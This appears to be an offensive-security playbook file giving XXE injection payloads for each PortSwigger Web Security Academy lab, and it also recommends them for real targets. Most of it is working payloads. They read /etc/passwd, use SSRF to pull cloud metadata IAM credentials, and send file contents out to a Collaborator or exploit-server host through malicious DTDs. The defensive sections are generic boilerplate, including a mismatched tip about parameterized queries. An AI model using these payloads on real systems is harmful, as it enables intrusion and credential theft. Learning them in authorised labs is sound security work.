---
name: "XXE Injection — Complete Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1190"]
tools: [burp-suite, curl, sqlmap, ffuf, python]
difficulty: "advanced"
---

# XXE Injection — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. Difficulty: 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- Studying for BSCP (Burp Suite Certified Practitioner) certification
- Testing real-world targets for these vulnerability classes
- Bug bounty hunting — these exact techniques find real bugs
- Building exploitation chains

## Prerequisites
- Burp Suite Professional (Community works for most)
- Browser with proxy configured
- Burp Collaborator or interactsh for OOB testing


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: External entities retrieve files 🟢 APPRENTICE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
---

### Lab 2: XXE to perform SSRF 🟢 APPRENTICE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
---

### Lab 3: Blind XXE out-of-band 🟡 PRACTITIONER
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP-COLLAB.net/xxe">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
---

### Lab 4: Blind XXE via parameter entities 🟡 PRACTITIONER
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://BURP-COLLAB.net/xxe"> %xxe;]>
```
Parameter entities (`%`) work when regular entities are blocked.
---

### Lab 5: Blind XXE exfiltrate via malicious DTD 🟡 PRACTITIONER
Host DTD on exploit server:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?x=%file;'>">
%eval; %exfil;
```
Then: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER/dtd"> %xxe;]>`
---

### Lab 6: Blind XXE via error messages 🟡 PRACTITIONER
Malicious DTD:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval; %error;
```
File contents appear in the XML parsing error message.
---

### Lab 7: XInclude retrieve files 🟡 PRACTITIONER
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
When you can't control the full XML document, use XInclude.
---

### Lab 8: XXE via image upload 🟡 PRACTITIONER
Upload SVG:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<text x="0" y="20">&xxe;</text></svg>
```
---

### Lab 9: Repurposing local DTD 🔴 EXPERT
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///z/%file;&#x27;>">%eval;%error;'>
  %local_dtd;
]>
```
Override an entity in a known local DTD to trigger the error-based exfiltration.
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research Methodology
When a standard technique doesn't work:
1. **Identify the filter**: What chars/patterns are blocked?
2. **Research bypasses**: Search GitHub, Twitter, PortSwigger Research for new techniques
3. **Fuzz extensively**: Use Burp Intruder with custom charset/tag lists
4. **Chain vulnerabilities**: Combine two medium findings into one critical
5. **Check encoding layers**: URL, HTML entity, Unicode, double-encode, XML entity


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PortSwigger All Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
